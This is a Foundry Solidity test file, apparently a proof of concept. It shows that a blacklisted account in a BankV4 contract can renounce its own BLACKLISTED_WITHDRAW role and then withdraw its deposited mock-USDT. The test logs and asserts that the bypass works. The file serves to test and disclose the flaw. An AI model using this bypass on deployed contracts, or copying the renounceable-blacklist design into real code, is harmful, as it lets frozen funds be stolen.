// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {BankV4} from "../src/BankV4.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract BankV3Test is Test {
    BankV4 public bank;
    bytes32 public constant BLACKLISTED_WITHDRAW = keccak256("BLACKLISTED_WITHDRAW");

    // This is with 18 decimals as it is Mock, but in reality it is 6 decimals
    ERC20Mock public USDT;

    address mohamed = makeAddr("Mohamed");
    address ahmed = makeAddr("Ahmed");
    address asmaa = makeAddr("Asmaa");
    address admin = makeAddr("admin");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        USDT = new ERC20Mock();
        bank = new BankV4(address(USDT), admin);

        vm.startPrank(mohamed);
        USDT.mint(mohamed, 1e18);
        USDT.approve(address(bank), 1e18);
        bank.depositUSD(1e18);
        vm.stopPrank();

        vm.startPrank(ahmed);
        USDT.mint(ahmed, 1e18);
        USDT.approve(address(bank), 1e18);
        bank.depositUSD(1e18);
        vm.stopPrank();

        vm.startPrank(asmaa);
        USDT.mint(asmaa, 0.5e18);
        USDT.approve(address(bank), 0.5e18);
        bank.depositUSD(0.5e18);
        vm.stopPrank();
    }

    function test_bankV4_bypass_blacklist() public {
        vm.startPrank(attacker);
        USDT.mint(attacker, 50e18);
        USDT.approve(address(bank), 50e18);
        bank.depositUSD(50e18);
        vm.stopPrank();

        vm.prank(admin);
        bank.blackListAccount(attacker);

        console.log("Attacker Bank Balance Before Attack:", bank.accountsBalances(attacker));
        console.log("Attacker USD Balance Before Attack:", USDT.balanceOf(attacker));
        console.log("Is Attacker BlackListed:", bank.hasRole(BLACKLISTED_WITHDRAW, attacker));
        assertEq(bank.accountsBalances(attacker), 50e18);
        assertEq(USDT.balanceOf(address(attacker)), 0);
        assert(bank.hasRole(BLACKLISTED_WITHDRAW, attacker));

        vm.startPrank(attacker);
        bank.renounceRole(BLACKLISTED_WITHDRAW, attacker);

        bank.withdrawUSD(50e18, attacker);

        console.log("-----------");
        console.log("Attacker Bank Balance After Attack:", bank.accountsBalances(attacker));
        console.log("Attacker USD Balance After Attack:", USDT.balanceOf(attacker));
        console.log("Is Attacker BlackListed:", bank.hasRole(BLACKLISTED_WITHDRAW, attacker));

        assertEq(bank.accountsBalances(attacker), 0);
        assertEq(USDT.balanceOf(address(attacker)), 50e18);
        assert(!bank.hasRole(BLACKLISTED_WITHDRAW, attacker));
    }
}
